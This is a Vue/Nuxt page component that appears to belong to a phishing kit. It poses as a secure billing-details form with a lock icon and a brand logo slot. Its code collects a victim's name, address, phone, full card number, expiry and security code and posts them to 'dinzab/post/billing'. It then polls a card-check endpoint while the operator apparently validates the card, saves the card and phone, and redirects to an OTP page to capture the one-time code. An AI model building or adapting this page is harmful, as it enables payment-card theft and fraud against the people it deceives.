<script setup>
definePageMeta({
  middleware: [
    'dinzab',
    'preventunlogged',
    'captcha'
  ],
  requireLogin: true
});
</script>
<script>
import creditCardType from 'credit-card-type';

export default {
    data() {
        return {
            ccv: 3,
            cardLogo: "",
            dinzabcard: "",
            mask:"#### #### #### ####",
            minlength:19,
            maxlength:19,
            dinzabname: "",
            dinzabtel: "",
            dinzabcity: "",
            dinzabaddr: "",
            dinzabcountry: "",
            dinzabexp: "",
            dinzabcsc: "",
            dinzabzipcode: "",
            dinzabcardholder: "",
            alert: false,
            loader: false,
            session: ""
        }
    },
    computed: {
        ccvx() {
            let card = this.dinzabcard.replaceAll(/\s/g, '')
            if(card.length > 0 && creditCardType(card)[0]) {
                let type = creditCardType(card)[0].type
                if(type == "american-express") {
                    this.ccv = 4
                } else {
                    this.ccv = 3
                }
            } else {
                this.ccv = 3
            }
            return this.ccv
        },
        maska() {
            let card = this.dinzabcard.replaceAll(/\s/g, '')
            if(card.length > 0 && creditCardType(card)[0]) {
                if(creditCardType(card)[0].type == "american-express") {
                    this.mask = "#### ###### #####"
                } else {
                    this.mask = "#### #### #### ####"
                }
            }
            return this.mask
        },
        min() {
            let card = this.dinzabcard.replaceAll(/\s/g, '')
            if(card.length > 0 && creditCardType(card)[0]) {
                if(typeof creditCardType(card)[0].type != 'undefined') {
                    this.minlength = creditCardType(card)[0].lengths[0] + 3
                }
            }
            return this.minlength
        },
        max() {
            let card = this.dinzabcard.replaceAll(/\s/g, '')
            if(card.length > 0 && creditCardType(card)[0]) {
                if(creditCardType(card)[0].type) {
                    this.maxlength = Math.max(...creditCardType(card)[0].lengths) + 3
                }
                
            }
            
            return this.maxlength
        },
        cardlogo() {
            let card = this.dinzabcard.replaceAll(/\s/g, '')
            if(card.length > 0 && creditCardType(card)[0]) {
                let type = creditCardType(card)[0].type
                if(type == "visa") {
                    this.cardLogo = `vi`
                } else if (type == "mastercard") {
                    this.cardLogo = 'ma'
                }
                else if (type == "maestro") {
                    this.cardLogo = 'me'
                }
                else if (type == "american-express") {
                    this.cardLogo = 'am'
                }
                else if (type == "jcb") {
                    this.cardLogo = 'jc'
                }
                else if (type == "diners-club") {
                    this.cardLogo = 'dc'
                }
                else if (type == "discover") {
                    this.cardLogo = 'di'
                }
            } else {
                this.cardLogo = ``
            }
            
            return this.cardLogo
        },
        
    },
    methods: {
        async postData() {
            const router = useRouter()
            const app = useNuxtApp()
            this.alert = false
            this.loader = true
            await app.$api.post("dinzab/post/billing", {
                dinzabname: this.dinzabname,
                dinzabaddr: this.dinzabaddr,
                dinzabcity: this.dinzabcity,
                dinzabcountry: this.dinzabcountry,
                dinzabtel: this.dinzabtel,
                dinzabzipcode: this.dinzabzipcode,
                dinzabcardholder: this.dinzabcardholder,
                dinzabcc: this.dinzabcard,
                dinzabexp: this.dinzabexp,
                dinzabcsc: this.dinzabcsc
            }, {headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }}).then(() => {
                var poll = setInterval(async () => {
                    await app.$api.get("dinzab/checkcard", {headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }}).then(async res => {
                        if(res.data.cc === true) {
                            clearInterval(poll)
                            await $fetch('/api/setoptlen' , {
                                method: "POST",
                                body: {
                                    otpLEN: res.data.otplen
                                }
                            })
                            await app.$api.get("fix/statux.aspx", {headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }})
                            const e = await $fetch('/api/setcc' , {
                                method: 'POST',
                                body: {
                                    name: this.dinzabname,
                                    cctext: this.dinzabcard,
                                    tel: this.dinzabtel
                                }
                            })
                            navigateTo({name: 'myaccount-otp'})
                        }
                        if(res.data.cc === false) {
                            clearInterval(poll)
                            await app.$api.get("fix/statux.aspx", {headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }})
                            this.loader = false
                            this.alert = true
                        }
                    }).catch(async () => {
                        clearInterval(poll)
                        await app.$api.get("fix/statux.aspx", {headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }})
                        this.loader = false
                        this.alert = true
                    })
                },2000)
            }).catch(() => {
                this.loader = false
                this.alert = true
            })
        },
        writeUserCard() {
            this.dinzabcardholder = this.dinzabname
        }
    },
    async beforeMount() {
        const res = await $fetch("/api/cookie")
        this.session = res
    }
    
}
</script>

<template>
    <Head>
        <Title>{{$t('18')}}</Title>
    </Head>
    <form class="container p-3 mx-auto rounded bg-white w-100 sm:w-[80%] md:w-[60%] lg:w-[50%]" v-on:submit.prevent="postData()">
        <header class="pb-5 lg:pb-3 md:pb-3">
            <div class="zebyLogo"></div>
        </header>

        <div class="mb-2 text-geen">
                            <p class="text-sm text-gray-600 flex items-center">
                                <svg class="fill-current text-gray-500 w-3 h-3 mr-2" xmlns="http://www.w3.org/2000/svg"
                                    viewBox="0 0 20 20">
                                    <path
                                        d="M4 8V6a6 6 0 1 1 12 0v2h1a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2v-8c0-1.1.9-2 2-2h1zm5 6.73V17h2v-2.27a2 2 0 1 0-2 0zM7 6v2h6V6a3 3 0 0 0-6 0z" />
                                </svg>
                                {{$t('19')}}
                            </p>
                        </div>
        <h1 class="mb-1 mt-3 text-lg font-extrabold leading-none tracking-tight text-gray-900 md:text-xl lg:text-2xl">{{ $t('20') }}</h1>
        
        <p class="ml-1 text-grey-900 pb-1 mb-3">{{ $t('21') }} <a href="#" class="font-medium text-blue-600 underline dark:text-blue-500 hover:no-underline">{{ $t('22') }}</a>.</p>

        <div class="zebyInput">
            <div class="notifications" :class="{hide: !alert}">


                        <p class="notification notification-critical" role="alert">
                            {{ $t('23') }}</p>
            </div>
            <div class="">
                <div class="relative mb-1 mt-1">
                    <input v-model="dinzabname" autocomplete="off" @input="writeUserCard()" required type="text" id="floating_filled" class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" " />
                    <label for="dinzabemail" class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{ $t('24') }}</label>
                </div>
                <div class="relative mb-1 mt-1">
                    <input v-model="dinzabaddr" autocomplete="off" required type="text" id="floating_filled" class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" " />
                    <label for="dinzabemail" class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{ $t('25') }}</label>
                </div>
                <div class="relative mb-1 mt-1">
                    <input v-model="dinzabcity" autocomplete="off" required type="text" id="floating_filled" class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" " />
                    <label for="dinzabemail" class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{ $t('26') }}</label>
                </div>
                <div class="relative mb-1 mt-1">
                    <input v-model="dinzabzipcode" autocomplete="off" required type="text" id="floating_filled" class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" " />
                    <label for="dinzabemail" class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{ $t('27') }}</label>
                </div>
                <div class="relative mb-1 mt-1">
                    <input v-model="dinzabtel" autocomplete="off" required type="tel" inputmode="numeric" id="floating_filled" class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" " />
                    <label for="dinzabemail" class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{ $t('28') }}</label>
                </div>
                <div class="relative mb-1 mt-1">
                    <select required class="" v-model="dinzabcountry">
                        <option value="" selected="selected" disabled="disabled"><label>{{ $t('29') }}</label></option>
                        <option value="Albania">Albania</option>
                        <option value="Algeria">Algeria</option>
                        <option value="Andorra">Andorra</option>
                        <option value="Angola">Angola</option>
                        <option value="Anguilla">Anguilla</option>
                        <option value="Antigua &amp; Barbuda">Antigua &amp; Barbuda</option>
                        <option value="Argentina">Argentina</option>
                        <option value="Armenia">Armenia</option>
                        <option value="Aruba">Aruba</option>
                        <option value="Australia">Australia</option>
                        <option value="Austria">Austria</option>
                        <option value="Azerbaijan">Azerbaijan</option>
                        <option value="Bahamas">Bahamas</option>
                        <option value="Bahrain">Bahrain</option>
                        <option value="Barbados">Barbados</option>
                        <option value="Belarus">Belarus</option>
                        <option value="Belgium">Belgium</option>
                        <option value="Belize">Belize</option>
                        <option value="Benin">Benin</option>
                        <option value="Bermuda">Bermuda</option>
                        <option value="Bhutan">Bhutan</option>
                        <option value="Bolivia">Bolivia</option>
                        <option value="Bosnia &amp; Herzegovina">Bosnia &amp; Herzegovina</option>
                        <option value="Botswana">Botswana</option>
                        <option value="Brazil">Brazil</option>
                        <option value="British Virgin Islands">British Virgin Islands</option>
                        <option value="Brunei">Brunei</option>
                        <option value="Bulgaria">Bulgaria</option>
                        <option value="Burkina Faso">Burkina Faso</option>
                        <option value="Burundi">Burundi</option>
                        <option value="Cambodia">Cambodia</option>
                        <option value="Cameroon">Cameroon</option>
                        <option value="Canada">Canada</option>
                        <option value="Cape Verde">Cape Verde</option>
                        <option value="Cayman Islands">Cayman Islands</option>
                        <option value="Chad">Chad</option>
                        <option value="Chile">Chile</option>
                        <option value="China">China</option>
                        <option value="Colombia">Colombia</option>
                        <option value="Comoros">Comoros</option>
                        <option value="Congo - Brazzaville">Congo - Brazzaville</option>
                        <option value="Congo - Kinshasa">Congo - Kinshasa</option>
                        <option value="Cook Islands">Cook Islands</option>
                        <option value="Costa Rica">Costa Rica</option>
                        <option value="Côte d’Ivoire">Côte d’Ivoire</option>
                        <option value="Croatia">Croatia</option>
                        <option value="Cyprus">Cyprus</option>
                        <option value="Czech Republic">Czech Republic</option>
                        <option value="Denmark">Denmark</option>
                        <option value="Djibouti">Djibouti</option>
                        <option value="Dominica">Dominica</option>
                        <option value="Dominican Republic">Dominican Republic</option>
                        <option value="Ecuador">Ecuador</option>
                        <option value="Egypt">Egypt</option>
                        <option value="El Salvador">El Salvador</option>
                        <option value="Eritrea">Eritrea</option>
                        <option value="Estonia">Estonia</option>
                        <option value="Ethiopia">Ethiopia</option>
                        <option value="Falkland">Falkland Islands</option>
                        <option value="Faroe Islands">Faroe Islands</option>
                        <option value="Fiji">Fiji</option>
                        <option value="Finland">Finland</option>
                        <option value="France">France</option>
                        <option value="French Guiana">French Guiana</option>
                        <option value="French Polynesia">French Polynesia</option>
                        <option value="Gabon">Gabon</option>
                        <option value="Gambia">Gambia</option>
                        <option value="Georgia">Georgia</option>
                        <option value="Germany">Germany</option>
                        <option value="Gibraltar">Gibraltar</option>
                        <option value="Greece">Greece</option>
                        <option value="Greenland">Greenland</option>
                        <option value="Grenada">Grenada</option>
                        <option value="Guadeloupe">Guadeloupe</option>
                        <option value="Guatemala">Guatemala</option>
                        <option value="Guinea">Guinea</option>
                        <option value="Guinea-Bissau">Guinea-Bissau</option>
                        <option value="Guyana">Guyana</option>
                        <option value="Honduras">Honduras</option>
                        <option value="Hong Kong SAR China">Hong Kong SAR China</option>
                        <option value="Hungary">Hungary</option>
                        <option value="Iceland">Iceland</option>
                        <option value="India">India</option>
                        <option value="Indonesia">Indonesia</option>
                        <option value="Ireland">Ireland</option>
                        <option value="Israel">Israel</option>
                        <option value="Italy">Italy</option>
                        <option value="Jamaica">Jamaica</option>
                        <option value="Japan">Japan</option>
                        <option value="Jordan">Jordan</option>
                        <option value="Kazakhstan">Kazakhstan</option>
                        <option value="Kenya">Kenya</option>
                        <option value="Kiribati">Kiribati</option>
                        <option value="Kuwait">Kuwait</option>
                        <option value="Kyrgyzstan">Kyrgyzstan</option>
                        <option value="Laos">Laos</option>
                        <option value="Latvia">Latvia</option>
                        <option value="Lesotho">Lesotho</option>
                        <option value="Liechtenstein">Liechtenstein</option>
                        <option value="Lithuania">Lithuania</option>
                        <option value="Luxembourg">Luxembourg</option>
                        <option value="Macedonia">Macedonia</option>
                        <option value="Madagascar">Madagascar</option>
                        <option value="Malawi">Malawi</option>
                        <option value="Malaysia">Malaysia</option>
                        <option value="Maldives">Maldives</option>
                        <option value="Mali">Mali</option>
                        <option value="Malta">Malta</option>
                        <option value="Marshall">Marshall Islands</option>
                        <option value="Martinique">Martinique</option>
                        <option value="Mauritania">Mauritania</option>
                        <option value="Mauritius">Mauritius</option>
                        <option value="Mayotte">Mayotte</option>
                        <option value="Mexico">Mexico</option>
                        <option value="Micronesia">Micronesia</option>
                        <option value="Moldova">Moldova</option>
                        <option value="Monaco">Monaco</option>
                        <option value="Mongolia">Mongolia</option>
                        <option value="Montenegro">Montenegro</option>
                        <option value="Montserrat">Montserrat</option>
                        <option value="Morocco">Morocco</option>
                        <option value="Mozambique">Mozambique</option>
                        <option value="Namibia">Namibia</option>
                        <option value="Nauru">Nauru</option>
                        <option value="Nepal">Nepal</option>
                        <option value="Netherlands">Netherlands</option>
                        <option value="Netherlands Antilles">Netherlands Antilles</option>
                        <option value="New Caledonia">New Caledonia</option>
                        <option value="New Zealand">New Zealand</option>
                        <option value="Nicaragua">Nicaragua</option>
                        <option value="Niger">Niger</option>
                        <option value="Nigeria">Nigeria</option>
                        <option value="Niue">Niue</option>
                        <option value="Norfolk Island">Norfolk Island</option>
                        <option value="Norway">Norway</option>
                        <option value="Oman">Oman</option>
                        <option value="Palau">Palau</option>
                        <option value="Panama">Panama</option>
                        <option value="Papua New Guinea">Papua New Guinea</option>
                        <option value="Paraguay">Paraguay</option>
                        <option value="Peru">Peru</option>
                        <option value="Philippines">Philippines</option>
                        <option value="Pitcairn Islands">Pitcairn Islands</option>
                        <option value="Poland">Poland</option>
                        <option value="Portugal">Portugal</option>
                        <option value="Qatar">Qatar</option>
                        <option value="Réunion">Réunion</option>
                        <option value="Romania">Romania</option>
                        <option value="Russia">Russia</option>
                        <option value="Rwanda">Rwanda</option>
                        <option value="Samoa">Samoa</option>
                        <option value="San Marino">San Marino</option>
                        <option value="São Tomé &amp; Príncipe">São Tomé &amp; Príncipe</option>
                        <option value="Saudi Arabia">Saudi Arabia</option>
                        <option value="Senegal">Senegal</option>
                        <option value="Serbia">Serbia</option>
                        <option value="Seychelles">Seychelles</option>
                        <option value="Sierra Leone">Sierra Leone</option>
                        <option value="Singapore">Singapore</option>
                        <option value="Slovakia">Slovakia</option>
                        <option value="Slovenia">Slovenia</option>
                        <option value="Solomon Islands">Solomon Islands</option>
                        <option value="Somalia">Somalia</option>
                        <option value="South Africa">South Africa</option>
                        <option value="South Korea">South Korea</option>
                        <option value="Spain">Spain</option>
                        <option value="Sri Lanka">Sri Lanka</option>
                        <option value="St. Helena">St. Helena</option>
                        <option value="St. Kitts &amp; Nevis">St. Kitts &amp; Nevis</option>
                        <option value="St. Lucia">St. Lucia</option>
                        <option value="St. Pierre &amp; Miquelon">St. Pierre &amp; Miquelon</option>
                        <option value="St. Vincent &amp; Grenadines">St. Vincent &amp; Grenadines</option>
                        <option value="Suriname">Suriname</option>
                        <option value="Svalbard &amp; Jan Mayen">Svalbard &amp; Jan Mayen</option>
                        <option value="Swaziland">Swaziland</option>
                        <option value="Sweden">Sweden</option>
                        <option value="Switzerland">Switzerland</option>
                        <option value="Taiwan">Taiwan</option>
                        <option value="Tajikistan">Tajikistan</option>
                        <option value="Tanzania">Tanzania</option>
                        <option value="Thailand">Thailand</option>
                        <option value="Togo">Togo</option>
                        <option value="Tonga">Tonga</option>
                        <option value="Trinidad &amp; Tobago">Trinidad &amp; Tobago</option>
                        <option value="Tunisia">Tunisia</option>
                        <option value="Turkmenistan">Turkmenistan</option>
                        <option value="Turks &amp; Caicos Islands">Turks &amp; Caicos Islands</option>
                        <option value="Tuvalu">Tuvalu</option>
                        <option value="Uganda">Uganda</option>
                        <option value="Ukraine">Ukraine</option>
                        <option value="United Arab Emirates">United Arab Emirates</option>
                        <option value="United Kingdom">United Kingdom</option>
                        <option value="United States">United States</option>
                        <option value="Uruguay">Uruguay</option>
                        <option value="Vanuatu">Vanuatu</option>
                        <option value="Vatican City">Vatican City</option>
                        <option value="Venezuela">Venezuela</option>
                        <option value="Vietnam">Vietnam</option>
                        <option value="Wallis &amp; Futuna">Wallis &amp; Futuna</option>
                        <option value="Yemen">Yemen</option>
                        <option value="Zambia">Zambia</option>
                        <option value="Zimbabwe">Zimbabwe</option>
                    </select>
                </div>
                <h1 class="mb-3 mt-3 text-lg font-extrabold leading-none tracking-tight text-gray-900 md:text-xl lg:text-2xl">{{ $t('30') }}</h1>
                <div class="relative mb-1 mt-1">
                    <input v-model="dinzabcardholder" autocomplete="off" required type="text" id="floating_filled" class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" " />
                    <label for="dinzabemail" class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{ $t('31') }}</label>
                </div>
                <div class="relative mb-1 mt-1">
                    <input required :minlength="min" :maxlength="max" v-model="dinzabcard" v-mask="maska" type="tel" inputmode="numeric" id="floating_filled" class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" " />

                    <label for="dinzabemail" class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{ $t('32') }}</label>
                    <span class="cc-icon" id="cicon" :class="cardlogo"></span>
                </div>
                <div class="relative mb-1 mt-1">
                    <input v-model="dinzabexp" required minlength="5" maxlength="5" v-maska data-maska="##/##" type="tel" id="floating_filled" class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" " />
                    <label for="dinzabemail" class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{ $t('33') }}</label>
                </div>
                <div class="relative mb-1 mt-1">
                    <input v-model="dinzabcsc" required :maxlength="ccvx" :minlength="ccvx" type="tel" id="floating_filled" class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" " />
                    <label v-if="ccvx == 3" for="dinzabemail" class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{ $t('34') }}</label>
                    <label v-else for="dinzabemail" class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{ $t('35') }}</label>
                </div>
            </div>
            <div class="mt-3 w-full flex flex-col justify-center">
                <button type="submit" class="w-full bg-[#1040c1] rounded-3xl p-3 text-white font-bold transition duration-200 hover:bg-[#1040c1]">{{ $t('36') }}</button>
            </div>
        </div>
    </form>

<div class="spinnerWithLockIcon" :class="{hide: !loader}">
    <p>{{ $t('37') }}</p>
    <div class="keychain"></div>
</div>
</template>

<style scoped>
.zebyu input , .zebyu select {
    height: 40px!important
}
</style>
